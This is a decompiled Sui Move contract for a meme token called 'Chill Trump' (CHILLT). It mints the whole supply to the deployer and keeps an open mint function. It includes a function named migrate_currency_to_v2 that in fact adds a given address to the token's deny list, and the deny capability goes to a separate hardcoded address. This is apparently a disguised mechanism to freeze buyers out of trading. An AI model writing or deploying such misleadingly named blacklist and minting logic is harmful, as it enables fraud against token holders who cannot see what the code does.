module 0xae0e64b8b55d47d8810a719efc0541569d9f42d7fa62017bd55d4db64a2b8ceb::chillt {
    struct CHILLT has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CHILLT>, arg1: 0x2::coin::Coin<CHILLT>) {
        0x2::coin::burn<CHILLT>(arg0, arg1);
    }

    fun init(arg0: CHILLT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLT>(arg0, 9, b"CHILLT", b"Chill Trump", b"$CHILLT - Make America Chill Again", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/E9HkGyDrjJnDDQek2dajCZJ3CMEMBiPc8Q52UDRmpump.png?size=xl&key=b728a0")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLT>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHILLT>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLT>>(v1, @0x4a7a4b36b1ba4b8b9b1da4d9335dae3bb2e43e5ef595a022bfca70faded48047);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLT>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CHILLT>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CHILLT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

